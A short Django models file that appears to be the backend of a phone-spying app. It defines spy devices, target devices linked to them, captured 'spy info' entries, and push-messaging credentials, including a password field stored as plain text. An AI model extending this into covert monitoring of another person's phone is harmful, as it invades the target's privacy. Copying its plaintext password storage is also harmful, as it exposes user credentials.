from django.db import models

# Create your models here.


class Device(models.Model):
    Uuid = models.CharField(max_length=128, unique=True)
    class Meta:
        abstract = True

class SpyDevice(Device):
    nickname = models.CharField(max_length=400)
    C2DMID = models.CharField(max_length=300)


class TargetDevice(Device):
    spy = models.ForeignKey(SpyDevice, null = True)

class SpyInfo(models.Model):
    device = models.ForeignKey(TargetDevice)
    title = models.CharField(max_length=50)
    text = models.CharField(max_length=256)

class C2DMInfo(models.Model):
    user = models.CharField(max_length=100, primary_key = True)
    authtoken = models.CharField(max_length = 200)
    password = models.CharField(max_length = 64)

